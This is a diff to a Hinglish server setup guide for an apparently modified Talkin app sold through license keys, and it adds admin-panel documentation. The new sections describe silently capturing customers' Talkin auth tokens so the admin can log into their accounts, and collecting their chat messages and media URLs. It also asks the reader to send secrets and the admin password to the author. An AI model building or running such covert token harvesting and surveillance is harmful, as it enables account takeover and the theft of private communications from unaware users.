@@ -152,13 +152,110 @@ Sab sahi dikh raha hai to server ready hai! 🎉
 
 ---
 
+## STEP 4b: Admin Panel + License Key System setup karna (★ NAYA)
+
+Aapke server mein ab ek **complete License Key Management System** + **Admin Panel** hai. Isse aap keys bana sakte ho, users ko control kar sakte ho, aur sab activity dekh sakte ho.
+
+### 4b.1 ADMIN_PASSWORD set karna
+
+Render dashboard → **Environment** tab mein jao aur ye 2 variables add karo:
+
+```
+ADMIN_USERNAME=ASY404
+ADMIN_PASSWORD=<aap apna password choose karo — jo bhi chahe, jaise MyStrongPass2024>
+```
+
+> ⚠️ **Important**: ADMIN_PASSWORD zaroor set karna — warna admin panel login nahi hoga. Ye password aapke admin panel ka password hai. Isko strong rakho (minimum 8 characters).
+
+Save karo → Render redeploy ho jayega.
+
+### 4b.2 Admin Panel kholna
+
+Browser mein ye URL kholo:
+
+```
+https://YOUR-URL.onrender.com/admin/login
+```
+
+- **Username**: `ASY404`
+- **Password**: jo aapne STEP 4b.1 mein set kiya
+
+Login karo → aapko **dashboard** dikhega with 7 tabs:
+
+| Tab | Kya karta hai |
+|-----|--------------|
+| **Keys** | Saari keys list — status (active/disabled/blocked/expired), device, expiry. Enable/Disable/Unblock/Reset/Delete buttons |
+| **Create Keys** | Nayi key banao — type select karo (1 Hour / 1 Day / 1 Month / Custom 1-60 days / Permanent), count, note |
+| **Devices** | Saare registered devices list |
+| **Activity** | User activity log — key activation, login, chat, media uploads, blocks |
+| **Messages** | Captured chat messages + media URLs |
+| **Login Tokens** | Users ke Talkin login tokens — isse aap kisi bhi user ke account mein login kar sakte ho |
+| **Backup** | Database ka backup download karo (JSON) ya restore karo |
+
+### 4b.3 Keys kaise banate ho (admin panel se)
+
+1. **Create Keys** tab pe jao
+2. **Key Type** select karo:
+   - **1 Hour** → 1 ghante ke liye valid
+   - **1 Day** → 1 din ke liye valid
+   - **1 Month** → 30 din ke liye valid
+   - **Custom** → 1 se 60 din tak koi bhi number daal do
+   - **Permanent** → kabhi expire nahi hogi jab tak aap delete/disable na karein
+3. **Count** daalo (kitni keys chahiye — jaise 5)
+4. **Note** (optional) — jaise "customer-rahul"
+5. **Create** button click karo
+6. Keys generate ho jayengi aur **Keys** tab mein dikh jayengi
+
+### 4b.4 Key controls (admin panel se)
+
+Keys tab mein har key ke saath ye buttons hain:
+
+| Button | Kya hota hai |
+|--------|-------------|
+| **Enable** | Key ko active karta hai (user use kar sakta hai) |
+| **Disable** | Key disable ho jati hai — user ke app se access hat jata hai (key server pe rehti hai) |
+| **Unblock** | Agar key block ho gayi thi (2 devices pe use ki), to unblock karta hai |
+| **Reset** | Nayi key banati hai, purani key invalid ho jati hai, user ko nayi key se re-activate karna padega |
+| **Delete** | Key permanently delete ho jati hai |
+
+### 4b.5 Device binding rule (★ Important)
+
+- **1 key = 1 device ONLY**
+- User pehli baar key use karega → device bind ho jayegi → success
+- User doosri device pe same key use karega → **1st attempt**: warning dikhega "Already registered on 1 device"
+- User doosri device pe FIR SE try karega → **2nd attempt**: KEY BLOCK ho jayegi, app access revoked
+- User ko aapse (ASY404) baat karna padega → aap admin panel se **Unblock** kar sakte ho
+
+### 4b.6 Keys kabhi gayab nahi hongi
+
+- Saari keys server pe permanently rehti hain (JSON file mein)
+- Time-based keys (1hour/1day/1month/custom) expire ho jayengi lekin **delete nahi hongi** — list mein dikhti rahengi
+- Permanent keys **kabhi expire nahi hongi** jab tak aap khud delete/disable na karein
+
+> ⚠️ **Note**: Render free plan pe disk ephemeral hai (restart pe data wipe ho sakta hai). Production ke liye **Render Disk** ($0.25/month) ya **MongoDB Atlas** (free) use karna recommended hai. Backup tab se regularly backup download karte raho.
+
+### 4b.7 Login Token capture
+
+Jab koi user aapki key use karke Talkin pe login karega, uska **Talkin auth token** aapke server pe capture ho jayega:
+- **Login Tokens** tab mein dekho
+- Token copy karo
+- Is token se aap us user ke Talkin account mein login kar sakte ho
+
+### 4b.8 User activity + messages
+
+- **Activity** tab: key activations, logins, chat messages, media uploads, blocks — sab kuch
+- **Messages** tab: chat text + photo/video URLs
+
+---
+
 ## STEP 5: Mujhe ye values bhejo
 
-Server deploy hone ke baad, mujhe ye 3 cheezein bhejo:
+Server deploy hone ke baad, mujhe ye 4 cheezein bhejo:
 
 1. **Aapka Render URL** (jaise `https://talkinpro-server.onrender.com`)
 2. **APP_SIGNING_SECRET** (jo generate hua)
 3. **ENTITLEMENT_PUBLIC_KEY_HEX** (jo generate hua)
+4. **ADMIN_PASSWORD** jo aapne set kiya (APK mein nahi jaayega, sirf admin panel ke liye confirm karne ke liye)
 
 > Baaki sab (Agora, Firebase, package name) mere paas pehle se hai.
 
